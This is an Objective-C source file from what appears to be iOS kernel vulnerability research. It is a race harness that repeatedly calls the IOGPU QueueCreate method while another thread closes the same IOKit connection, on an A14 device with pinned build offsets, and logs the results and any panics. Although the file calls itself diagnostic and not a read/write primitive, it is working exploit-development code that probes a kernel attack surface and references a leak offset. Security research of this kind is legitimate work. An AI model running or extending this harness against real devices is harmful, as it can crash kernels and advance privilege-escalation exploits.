//
//  P014CloseMethodRace.m
//  P007OpenOnly
//
//  T014-A remake for A14 26.5 / 23F77
//
//  v2:
//    - sel=7 structIn sweep 0x408..0x600 (XR fixed 0x408 → BadArg on A14)
//    - IOGPU via DeviceCreate + GetConnect (not IOServiceOpen "IOGPUDevice")
//    - typeId at in+0x404 (same ABI as working A14 probes)
//    - Pins from A14_23F77_LabOffsets.h
//
//  Race: Thread A loops IOConnectCallMethod(sel=7); Thread B IOServiceClose.
//  NOT KRW. Panic = anomaly. Survived = serialized / port died first.
//

#import "P014CloseMethodRace.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;

typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef void *(*DevCreate_t)(io_service_t);
typedef uint32_t (*GetConn_t)(void *);
typedef void (*DevRelease_t)(void *);

#define P014_RACE_ITERS     200
#define P014_REPORT_EVERY   20
#define P014_METHOD_LOOPS   50000

static FILE *p014_fp;

static void p014_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void p014_log(NSString *fmt, ...) {
    if (!p014_fp) {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:
                          @"p014_close_method_race_log.txt"];
        p014_fp = fopen(path.UTF8String, "w");
        if (p014_fp) {
            setvbuf(p014_fp, NULL, _IOLBF, 0);
            fprintf(p014_fp, "=== p014close session %s ===\n",
                    [[NSDate date] description].UTF8String);
        }
    }
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p014_fp) {
        fprintf(p014_fp, "%s\n", msg.UTF8String);
        fflush(p014_fp);
    }
    NSLog(@"p014 %@", msg);
}

static const char *p014_kr(kern_return_t r) {
    unsigned u = (unsigned)r;
    if (r == 0) return "SUCCESS";
    if (u == 0xe00002c2) return "BadArgument";
    if (u == 0xe00002c7) return "NotOpen";
    if (u == 0xe00002bd) return "NoDevice";
    if (u == 0x10000003) return "INVALID_DEST";
    return "?";
}

typedef struct {
    IOServiceMatching_t matching;
    IOServiceGetMatchingService_t getsvc;
    IOServiceClose_t close;
    IOObjectRelease_t release;
    IOConnectCallMethod_t call;
    mach_port_t mainPort;
    DevCreate_t devCreate;
    GetConn_t getConn;
    DevRelease_t devRelease;
    io_service_t svc;
} P014IO;

typedef struct {
    P014IO *io;
    io_connect_t conn;
    uint32_t typeId;
    uint32_t sel7sz;
    volatile int stop;
    volatile int calls;
    volatile int ok;
    volatile int last_kr;
} P014RaceCtx;

static int p014_syms(P014IO *io) {
    memset(io, 0, sizeof(*io));
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        p014_log(@"STOP dlopen iokit=%p iogpu=%p", iokit, iogpu);
        return -1;
    }
    io->matching = dlsym(iokit, "IOServiceMatching");
    io->getsvc = dlsym(iokit, "IOServiceGetMatchingService");
    io->close = dlsym(iokit, "IOServiceClose");
    io->release = dlsym(iokit, "IOObjectRelease");
    io->call = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    io->devCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    io->getConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    io->devRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    if (!io->matching || !io->getsvc || !io->close || !io->call || !mp ||
        !io->devCreate || !io->getConn) {
        p014_log(@"STOP dlsym");
        return -1;
    }
    io->mainPort = *mp;
    io->svc = io->getsvc(io->mainPort, io->matching("IOGPU"));
    if (!io->svc) {
        p014_log(@"STOP no IOGPU service");
        return -1;
    }
    return 0;
}

static kern_return_t p014_sel7(P014IO *io, io_connect_t conn, uint32_t typeId,
                               uint32_t insz, uint32_t *qidOut, uint64_t *w1Out) {
    uint8_t inBuf[0x600];
    uint8_t outBuf[0x10];
    if (insz < A14_23F77_IOGPU_QUEUE_CREATE_SIZE) insz = A14_23F77_IOGPU_QUEUE_CREATE_SIZE;
    if (insz > sizeof(inBuf)) insz = (uint32_t)sizeof(inBuf);
    memset(inBuf, 0, sizeof(inBuf));
    memset(outBuf, 0, sizeof(outBuf));
    *(uint32_t *)(inBuf + 0x400) = 1;
    *(uint8_t *)(inBuf + 0x404) = (uint8_t)typeId;
    size_t outCnt = sizeof(outBuf);
    kern_return_t r = io->call(conn, A14_23F77_IOGPU_QUEUE_CREATE_SEL, NULL, 0, inBuf, insz,
                               NULL, NULL, outBuf, &outCnt);
    if (qidOut) *qidOut = (uint32_t)(*(uint64_t *)outBuf);
    if (w1Out) *w1Out = *(uint64_t *)(outBuf + 8);
    return r;
}

static uint32_t p014_find_sel7_size(P014IO *io, io_connect_t conn, uint32_t typeId) {
    p014_log(@"[calib] QueueCreate sel=%u sweep 0x%x..0x600 (A14 expected 0x410)",
             A14_23F77_IOGPU_QUEUE_CREATE_SEL, A14_23F77_IOGPU_QUEUE_CREATE_SIZE);
    for (uint32_t sz = A14_23F77_IOGPU_QUEUE_CREATE_SIZE; sz <= 0x600; sz += 8) {
        uint32_t qid = 0;
        uint64_t w1 = 0;
        kern_return_t r = p014_sel7(io, conn, typeId, sz, &qid, &w1);
        if (r == 0) {
            p014_log(@"[calib] sel=7 OK sz=0x%x qid=%u w1=0x%llx (leak @+0x%x)",
                     sz, qid, (unsigned long long)w1, A14_23F77_IOGPU_QUEUE_LEAK);
            return sz;
        }
        if (sz == A14_23F77_IOGPU_SEL7_MIN_IN || sz == 0x410 || sz == 0x500)
            p014_log(@"[calib] sel=7 sz=0x%x -> 0x%08x (%s)",
                     sz, (unsigned)r, p014_kr(r));
    }
    p014_log(@"[calib] no sel=7 size worked");
    return 0;
}

static void *p014_method_thread(void *arg) {
    P014RaceCtx *ctx = arg;
    while (!ctx->stop) {
        uint32_t qid = 0;
        kern_return_t r = p014_sel7(ctx->io, ctx->conn, ctx->typeId,
                                    ctx->sel7sz, &qid, NULL);
        ctx->calls++;
        if (r == 0) ctx->ok++;
        ctx->last_kr = (int)r;
    }
    return NULL;
}

static void p014_race(P014IO *io, uint32_t typeId, uint32_t sel7sz) {
    p014_log(@"[race] sel=7 vs IOServiceClose — %d iters sz=0x%x",
             P014_RACE_ITERS, sel7sz);
    int success = 0, badarg = 0, invdest = 0, other = 0;

    for (int iter = 0; iter < P014_RACE_ITERS; iter++) {
        void *dev = io->devCreate(io->svc);
        if (!dev) {
            p014_log(@"[race] iter=%d DeviceCreate fail", iter);
            continue;
        }
        io_connect_t conn = io->getConn(dev);
        int jitter = (iter % 8) * 200;

        P014RaceCtx ctx = {0};
        ctx.io = io;
        ctx.conn = conn;
        ctx.typeId = typeId;
        ctx.sel7sz = sel7sz;
        ctx.stop = 0;

        pthread_t th;
        pthread_create(&th, NULL, p014_method_thread, &ctx);
        if (jitter > 0) usleep(jitter);
        kern_return_t ckr = io->close(conn);
        ctx.stop = 1;
        pthread_join(th, NULL);

        unsigned u = (unsigned)ctx.last_kr;
        if (ctx.last_kr == 0) success++;
        else if (u == 0xe00002c2) badarg++;
        else if (u == 0x10000003) invdest++;
        else other++;

        if ((iter + 1) % P014_REPORT_EVERY == 0) {
            p014_log(@"[race] iter=%d jitter=%dus close=0x%x calls=%d ok=%d last=0x%x (%s)",
                     iter, jitter, (unsigned)ckr, ctx.calls, ctx.ok,
                     (unsigned)ctx.last_kr, p014_kr(ctx.last_kr));
        }
        if (io->devRelease) io->devRelease(dev);
    }

    p014_log(@"[race] FINAL success=%d badarg=%d invalid_dest=%d other=%d",
             success, badarg, invdest, other);
    p014_log(@"[race] panic missing = anomaly; survive = serialized/port-dead");
}

@implementation P014CloseMethodRace

+ (void)tap {
    if (p014_fp) { fclose(p014_fp); p014_fp = NULL; }
    p014_log(@"========================================");
    p014_log(@"p014 v3: IOGPU close-vs-QueueCreate (A14 23F77)");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p014close"];
    if (stop) { p014_log(@"%@", stop); return; }
    p014_log(@"create sel=%u stIn=0x%x destroy sel=%u submit sel=%u word1=+0x%x SysMem +0x%x",
             A14_23F77_IOGPU_QUEUE_CREATE_SEL, A14_23F77_IOGPU_QUEUE_CREATE_SIZE,
             A14_23F77_IOGPU_QUEUE_DESTROY_SEL, A14_23F77_IOGPU_SUBMIT_SEL,
             A14_23F77_IOGPU_QUEUE_LEAK, A14_23F77_SYSMEM_MD_OFF);
    p014_log(@"NOT KRW. Diagnostic only. Do not paste 21D50 +0x550 / 0x408.");
    p014_log(@"========================================");

    P014IO io;
    if (p014_syms(&io) != 0) {
        p014_log(@"=== verdict: CALIB FAILED ===");
        return;
    }

    void *dev = io.devCreate(io.svc);
    if (!dev) {
        p014_log(@"[calib] DeviceCreate FAILED");
        p014_log(@"=== verdict: CALIB FAILED ===");
        return;
    }
    io_connect_t conn = io.getConn(dev);
    uint32_t typeId = *(uint32_t *)((uint8_t *)dev + 8);
    p014_log(@"[calib] conn=%u typeId=0x%x", conn, typeId);

    uint32_t sz = p014_find_sel7_size(&io, conn, typeId);
    if (io.close) io.close(conn);
    if (io.devRelease) io.devRelease(dev);

    if (sz == 0) {
        p014_log(@"=== verdict: CALIB FAILED — QueueCreate sel=%u size not found ===",
                 A14_23F77_IOGPU_QUEUE_CREATE_SEL);
        if (io.release) io.release(io.svc);
        return;
    }

    p014_race(&io, typeId, sz);

    p014_log(@"=== verdict: see panic log; survive ≠ KRW ===");
    p014_log(@"NOT KRW. Diagnostic only.");
    if (io.release) io.release(io.svc);
}

@end
